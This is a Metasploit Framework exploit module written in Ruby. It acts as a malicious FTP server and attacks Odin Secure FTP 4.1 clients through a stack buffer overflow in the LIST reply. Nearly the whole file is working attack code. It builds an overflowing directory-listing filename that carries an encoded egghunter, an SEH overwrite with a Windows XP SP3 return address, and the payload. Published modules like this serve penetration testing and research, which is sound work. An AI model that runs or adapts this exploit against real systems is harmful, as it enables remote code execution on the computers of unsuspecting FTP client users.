##
# $Id: odin_list_reply.rb 10665 2010-10-13 03:03:24Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Ranking = GoodRanking

	include Msf::Exploit::Remote::FtpServer
	include Msf::Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Odin Secure FTP 4.1 Stack Buffer Overflow (LIST)',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Odin Secure FTP 4.1,
				triggered when processing the response on a LIST command. During the overflow,
				a structured exception handler record gets overwritten.
			},
			'Author' 	 =>
				[
					'rick2600',		#found the bug
					'corelanc0d3r',	#wrote the exploit
				],
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 10665 $",
			'References'     =>
				[
					[ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'BadChars' => "\x00\xff\x0d\x5c\x2f\x0a",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'XP SP3 Universal', { 'Offset' => 264, 'Ret' => 0x10077622 } ],  # ppr [appface.dll]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 12 2010',
			'DefaultTarget'  => 0))

	end

	def setup
		super
	end

	def on_client_unknown_command(c,cmd,arg)
		c.put("200 OK\r\n")
	end

	def on_client_command_list(c,arg)

		conn = establish_data_connection(c)
		if(not conn)
			c.put("425 Can't build data connection\r\n")
			return
		end
		print_status(" - Data connection set up")
		code = 150
		c.put("#{code} Here comes the directory listing.\r\n")
		code = 226
		c.put("#{code} Directory send ok.\r\n")

		badchars = ""
		eggoptions =
		{
		:checksum => true,
		:eggtag => "W00T"
		}
		hunter,egg = generate_egghunter(payload.encoded,badchars,eggoptions)

		badchars = "\x00\xff\x0d\x5c\x2f\x0a"
		hunterenc = Msf::Util::EXE.encode_stub(framework, [ARCH_X86], hunter, ::Msf::Module::PlatformList.win32, badchars)

		offset_to_nseh=target['Offset']
		jmpback = "\xe9\x9c\xff\xff\xff"
		nops = "A" * 30
		filename = "A" * (offset_to_nseh-hunterenc.length-jmpback.length)

		nseh = "\xeb\xf9\x42\x42"
		seh = [target.ret].pack('V')
		junk2 = "A" * 4000

		buffer = filename + hunterenc + jmpback + nseh + seh + junk2 + egg
		print_status(" - Sending directory list via data connection")
		dirlist = "-rw-rw-r--    1 1176     1176         1060 Aug 16 22:22 #{buffer}\r\n"
		conn.put(dirlist)
		conn.close
		print_status(" - Payload sent, wait for hunter...")
		return

	end

end

